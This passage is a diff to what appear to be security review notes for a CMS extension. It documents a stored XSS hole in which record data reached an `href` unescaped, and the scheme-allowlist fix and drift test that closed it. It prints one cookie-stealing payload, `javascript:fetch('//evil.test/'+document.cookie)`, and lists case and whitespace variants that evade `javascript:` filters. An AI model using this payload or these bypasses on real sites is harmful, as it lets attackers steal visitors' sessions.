@@ -224,6 +224,46 @@ first version threw on `/cms` and turned a public route into a 500. That is the
 harness being more realistic than it looks, not a false alarm — a public route
 must not crash on a malformed request.
 
+### Record data reached an `href` unescaped — the third sink
+
+`bind.ts` states its safety rule at the top, and the rule is right as far as it
+goes: a template is authored by an admin and passes the HTML sanitiser; a
+record's values are DATA and never do, so a value landing in a property the
+renderer hands to `{@html}` is escaped at substitution time, which is the only
+moment both are in hand.
+
+It reasons about two sinks — `{@html}`, and everything else "because Svelte
+escapes a text node itself". A URL attribute is neither. Svelte does not
+neutralise `javascript:` in `href={…}`, and no sanitiser sees it: the template is
+scrubbed when STORED and the value is substituted afterwards, in the browser.
+
+Measured on the shipped code:
+
+```
+template  { href: '{{website}}' }
+record    { website: "javascript:fetch('//evil.test/'+document.cookie)" }
+bound     href -> "javascript:fetch('//evil.test/'+document.cookie)"
+```
+
+The template being admin-authored is fine — an admin who can write an `html`
+block can already run script, which is the `unfiltered_html` model this extension
+follows on purpose. **The record is not.** A CRM contact, a form submission, an
+imported row: writable by anyone who can add to a published collection. A visitor
+clicking the card runs script in the site's origin.
+
+`URL_KEYS` + `safeUrl` now guard the seven properties the renderer binds to an
+`href` or `src`. An allowlist of schemes rather than a `javascript:` denylist,
+because `\tjavascript:`, `JaVaScRiPt:` and `java\nscript:` are the same URL to a
+browser and all miss a naive match. Relative URLs pass; a protocol-relative
+`//evil.test` does not.
+
+**The drift test found a second instance the fix had missed.** `block-contract.ts`
+now asserts that every `href`/`src` the renderer binds is in `URL_KEYS`, and it
+failed on `img` — the gallery's `src={img.url}`, one level below the block's own
+keys. `HTML_KEYS` was already consulted at every nesting level and the URL list
+was not. Now both are. Writing the invariant found the bug that reading the fix
+had not.
+
 ### Still to cover in this extension
 
 `editor.ts` and `sites.ts` beyond their guards — the write paths, revisions,
